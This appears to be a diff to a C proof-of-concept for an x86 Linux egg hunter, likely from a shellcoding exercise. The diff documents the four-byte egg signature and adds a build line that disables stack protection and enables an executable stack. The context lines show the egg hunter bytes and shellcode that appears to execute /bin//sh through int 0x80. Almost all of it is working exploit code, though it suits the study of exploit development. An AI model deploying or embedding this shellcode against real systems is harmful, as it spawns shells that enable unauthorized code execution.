@@ -10,7 +10,14 @@
 #include <stdio.h>
 #include <string.h>
 
-#define EGG_SIG "\x90\x47\x90\x4F"
+/*
+ * Egg Signature:
+ *
+ *   0x4f    0x90    0x47    0x90
+ *    |       |       |       |
+ * dec edi - NOP - inc edi - NOP
+*/
+#define EGG_SIG "\x90\x47\x90\x4f"
 
 unsigned char egg_hunter[] = \
 	"\x99"                   /* cdq */
@@ -39,6 +46,12 @@ unsigned char shellcode[] = \
 	"\x68\x2f\x2f\x73\x68\x68\x2f\x62"
 	"\x69\x6e\x89\xe3\x89\xca\xcd\x80";
 
+/*
+ * $ gcc -Wl,-z,execstack -fno-stack-protector PoC.c -o PoC
+ *  [+] Egg Hunter Length:  13
+ *  [+] Shellcode Length + 4 byte egg:  100
+ *
+*/
 void main()
 {
 	printf("[+] Egg Hunter Length:  %d\n", strlen(egg_hunter));
